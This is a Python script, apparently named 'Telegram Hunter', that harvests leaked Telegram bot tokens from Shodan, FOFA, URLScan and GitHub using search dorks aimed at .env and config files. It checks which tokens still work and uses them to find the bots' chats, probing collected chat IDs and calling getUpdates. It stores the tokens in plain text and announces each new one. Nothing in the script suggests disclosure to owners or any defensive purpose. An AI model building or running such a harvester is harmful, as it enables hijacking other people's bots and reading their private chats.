import csv
import argparse
import asyncio
import sys
import os
import hashlib
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.core.security import security
from app.services.scanners import ShodanService, GithubService, UrlScanService, FofaService
from app.services.broadcaster_srv import broadcaster_service

# Initialize Services (Fofa/Censys/HybridAnalysis REMOVED - API access issues)
shodan = ShodanService()
fofa = FofaService()
github = GithubService()
urlscan = UrlScanService()

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

def get_known_chat_ids():
    """Fetch all unique known chat IDs from database"""
    try:
        res = db.table("discovered_credentials").select("chat_id").execute()
        if not res.data:
            return []
        # Filter None and duplicates
        ids = list(set([r['chat_id'] for r in res.data if r.get('chat_id')]))
        print(f"ℹ️ Found {len(ids)} unique known chat IDs in database.")
        return ids
    except Exception as e:
        print(f"⚠️ Failed to fetch known chat IDs: {e}")
        return []

def try_match_chat_id(token: str, candidates: list) -> int | None:
    """
    Try to find which chat ID the bot belongs to from a list of candidates.
    Returns the first matching chat_id or None.
    """
    import requests
    
    print(f"  🕵️‍♂️ Orphan Token: Checking against {len(candidates)} known chats...")
    
    for cid in candidates:
        try:
            # check if bot can see the chat
            url = f"https://api.telegram.org/bot{token}/getChat"
            res = requests.get(url, params={'chat_id': cid}, timeout=3)
            
            if res.status_code == 200 and res.json().get('ok'):
                chat = res.json()['result']
                name = chat.get('title') or chat.get('username') or str(cid)
                print(f"    ✨ MATCH FOUND! Chat: {name} ({cid})")
                return cid
                
            # Rate limit protection
            # time.sleep(0.1) 
        except Exception:
            pass
            
    return None

async def save_manifest(results, source_name: str, verbose=True):
    """
    Validates token format and checks if bot is active via Telegram API.
    Saves if token passes format check AND getMe - does NOT require chats.
    """
    import requests
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        # Step 1: Validate token format (reject Fernet/hashes)
        if not _is_valid_token(token):
            if verbose:
                print(f"  ❌ Invalid token format (Fernet/hash?): {token[:20]}...")
            continue
        
        token_hash = _calculate_hash(token)
        existing_id = None
        existing_has_chat = False
        
        try:
            # Step 2: Check if already exists
            existing = db.table("discovered_credentials").select("id, chat_id").eq("token_hash", token_hash).execute()
            if existing.data:
                existing_id = existing.data[0]['id']
                existing_has_chat = existing.data[0].get('chat_id') is not None
                if existing_has_chat:
                    if verbose:
                        print(f"  ⏭️ Token already exists with chat_id, skipping.")
                    continue
                else:
                    if verbose:
                        print(f"  🔄 Token exists but no chat_id, will update if we find one...")
            
            # Step 3: Validate token with Telegram getMe API (NO CHAT REQUIRED)
            if verbose:
                print(f"  🔍 Validating token {token[:15]}... via Bot API")
            
            base_url = f"https://api.telegram.org/bot{token}"
            me_res = requests.get(f"{base_url}/getMe", timeout=10)
            
            if me_res.status_code != 200 or not me_res.json().get('ok'):
                if verbose:
                    print(f"  ❌ Token invalid or revoked")
                continue
            
            bot_info = me_res.json().get('result', {})
            bot_username = bot_info.get('username', 'unknown')
            if verbose:
                print(f"  ✅ Token valid! Bot: @{bot_username}")
            
            # Step 4: Determine chat_id (from input or discovery)
            chat_id = item.get('chat_id')
            chat_name = None
            chat_type = None

            if chat_id:
                 if verbose: print(f"    📍 Using provided Chat ID: {chat_id}")
            else:
                # Try discovery
                try:
                    updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 10}, timeout=10)
                    if updates_res.status_code == 200 and updates_res.json().get('ok'):
                        updates = updates_res.json().get('result', [])
                        for update in updates:
                            for key in ['message', 'channel_post', 'my_chat_member']:
                                if key in update and update[key].get('chat'):
                                    chat = update[key]['chat']
                                    chat_id = chat.get('id')
                                    chat_name = chat.get('title') or chat.get('username') or chat.get('first_name')
                                    chat_type = chat.get('type')
                                    break
                            if chat_id:
                                break
                except:
                    pass
            
            # Step 5: Save to DB (INSERT new or UPDATE existing if we have chat_id)
            
            if existing_id and chat_id:
                # UPDATE existing record with new chat_id
                update_data = {
                    "chat_id": chat_id,
                    "status": "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                db.table("discovered_credentials").update(update_data).eq("id", existing_id).execute()
                if verbose:
                    print(f"  🔄 [UPDATED] Credential ID: {existing_id} - now has chat_id!")
                await broadcaster_service.send_log(
                    f"🔄 [{source_name}] **Updated Token!**\n"
                    f"Bot: @{bot_username}\n"
                    f"ID: `{existing_id}`\n"
                    f"Chat: {chat_name} ({chat_type})"
                )
                saved_count += 1
            elif existing_id and not chat_id:
                # Token exists, still no chat - skip
                if verbose:
                    print(f"  ⏭️ Token exists, still no chat_id found, skipping update.")
            else:
                # INSERT new record
                data = {
                    "bot_token": token,  # Store in plain text
                    "token_hash": token_hash,
                    "chat_id": chat_id,
                    "source": source_name,
                    "status": "pending" if not chat_id else "active",
                    "meta": {
                        **item.get("meta", {}),
                        "bot_username": bot_username,
                        "bot_id": bot_info.get('id'),
                        "chat_name": chat_name,
                        "chat_type": chat_type
                    }
                }
                
                res = db.table("discovered_credentials").insert(data).execute()
                
                if res.data:
                    status_label = "✅ ACTIVE" if chat_id else "⏳ PENDING (no chat)"
                    if verbose:
                        print(f"  🎯 [NEW] Saved Credential ID: {res.data[0]['id']} - {status_label}")
                    await broadcaster_service.send_log(
                        f"🎯 [{source_name}] **New Bot Token!**\n"
                        f"Bot: @{bot_username}\n"
                        f"Status: {status_label}"
                    )
                    saved_count += 1
                
        except Exception as e:
            if verbose: print(f"  ❌ Save Error: {e}")
            pass
    return saved_count

async def run_scanners():
    print("🚀 Starting LOCAL OSINT Scan (URLScan, GitHub, Shodan)...")
    await broadcaster_service.send_log("🚀 **Manual Scan Started** (Local Script)")
    print("-------------------------------------------------")

    # POOLED QUERIES (Greedy Approach)
    # These terms are tried across ALL services
    COMMON_QUERIES = [
        "api.telegram.org/bot",
        "bot_token",
        "TELEGRAM_BOT_TOKEN",
        "TELEGRAM_TOKEN",
        "Telegram Bot",
        "https://api.telegram.org"
    ]

    # 1. Shodan
    print("\n🌎 [Shodan] Starting Scan...")
    shodan_targets = []
    
    # Adapt common queries for Shodan (body search)
    for q in COMMON_QUERIES:
        shodan_targets.append(f'http.html:"{q}"')
    
    # Add Shodan-specific queries
    shodan_targets.extend([
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ])
    
    # Deduplicate
    shodan_targets = list(set(shodan_targets))

    for q in shodan_targets:
        print(f"  > Querying: {q}")
        try:
            results = shodan.search(q)
            count = await save_manifest(results, "shodan")
            print(f"    ✅ Saved {count} new credentials (from {len(results)} hits).")
            # time.sleep(1) # Slight delay
        except Exception as e:
            print(f"    ❌ Error: {e}")

    # 1.5 FOFA
    print("\n🦅 [FOFA] Starting Scan...")
    for q in COMMON_QUERIES:
        fofa_query = f'body="{q}"'
        print(f"  > Querying: {fofa_query}")
        try:
            results = fofa.search(fofa_query)
            count = await save_manifest(results, "fofa")
            print(f"    ✅ Saved {count} new credentials (from {len(results)} hits).")
            time.sleep(1)
        except Exception as e:
            print(f"    ❌ FOFA Error: {e}")

    # 2. URLScan
    print("\n🔍 [URLScan] Starting Scan...")
    
    # URLScan specific logic: loop through common queries
    # The service automatically wraps them in 'page.body:"X" OR page.url:*X*'
    
    for q in COMMON_QUERIES:
        try:
            print(f"  > Query: {q}")
            # print("  > Note: Deep scanning each result URL for tokens")
            results = urlscan.search(q)
            count = await save_manifest(results, "urlscan")
            print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
            time.sleep(2) # Rate limit protection
        except Exception as e:
            print(f"  ❌ URLScan Error: {e}")

    # 3. GitHub
    print("\n🐱 [GitHub] Starting Scan...")
    
    # GitHub Dorks
    # Combine Common Queries (Simple string match) + Complex Dorks
    github_dorks = []
    
    # Add common queries (quoted for exact phrase match if spaces)
    for q in COMMON_QUERIES:
        if " " in q:
            github_dorks.append(f'"{q}"')
        else:
            github_dorks.append(q)
            
    # Add Complex Specific Dorks
    github_dorks.extend([
        "filename:.env api.telegram.org",
        "path:config api.telegram.org",
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:python \"Telethon\" \"api_id\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\""
    ])
    
    # Deduplicate
    github_dorks = list(set(github_dorks))
    
    total_gh = 0
    for i, dork in enumerate(github_dorks):
        print(f"  > Dorking: {dork}")
        try:
            results = github.search(dork)
            count = await save_manifest(results, "github")
            total_gh += count
            print(f"    Found {len(results)} matches, {count} new.")
        except Exception as e:
            print(f"    ❌ Error: {e}")
        
        if i < len(github_dorks) - 1:
            time.sleep(2) # Respect rate limits slightly

    print("\n-------------------------------------------------")
    print("🏁 Full Scan Complete.")
    await broadcaster_service.send_log("🏁 **Manual Scan Complete.** Check Monitor Group for details.")
    print("   Check your Railway Worker logs (General Topic) for Enrichment alerts!")
    print("   (The worker will see the new 'pending' rows and enrich them automatically)")

async def import_from_csv(filename: str):
    """
    Reads tokens/chat_ids from CSV and processes them.
    Expected columns: token, chat_id (optional)
    """
    if not os.path.exists(filename):
        print(f"❌ File not found: {filename}")
        return

    print(f"📂 Importing from {filename}...")
    results = []
    
    with open(filename, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        # Handle headerless CSV or specific headers? 
        # Assuming header: token,chat_id
        # If no header, maybe first row is header?
        # Let's verify headers exist, otherwise warn.
        if not reader.fieldnames:
             print("❌ CSV must have headers: token, chat_id")
             return
             
        for row in reader:
            # Robust extraction of token (handle None/Empty)
            token = row.get('token') or row.get('bot_token')
            if not token or not token.strip(): 
                continue # Skip empty lines/tokens
            
            chat_id = row.get('chat_id')
            if chat_id and chat_id.strip():
                chat_id = int(chat_id.strip())
            else:
                chat_id = None
            
            results.append({
                "token": token.strip(),
                "chat_id": chat_id,
                "meta": {"source": "csv_import"}
            })

    # ORPHAN RECOVERY STRATEGY
    known_chats = get_known_chat_ids()
    if known_chats:
        print("🔍 Attempting to resolve orphan tokens (no chat_id)...")
        for item in results:
            if not item['chat_id']:
                # validation first to avoid wasting time on dead tokens
                # (simple format check)
                if ":" in item['token']:
                    found_id = try_match_chat_id(item['token'], known_chats)
                    if found_id:
                        item['chat_id'] = found_id

    print(f"🚀 Loaded {len(results)} items. testing and saving...")
    count = await save_manifest(results, "manual_import")
    print(f"🏁 Import Complete. Saved/Updated: {count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Telegram Hunter Manual Scanner')
    parser.add_argument('-i', '--import-file', help='CSV file to import tokens from (headers: token, chat_id)')
    
    args = parser.parse_args()
    
    if args.import_file:
        asyncio.run(import_from_csv(args.import_file))
    else:
        asyncio.run(run_scanners())
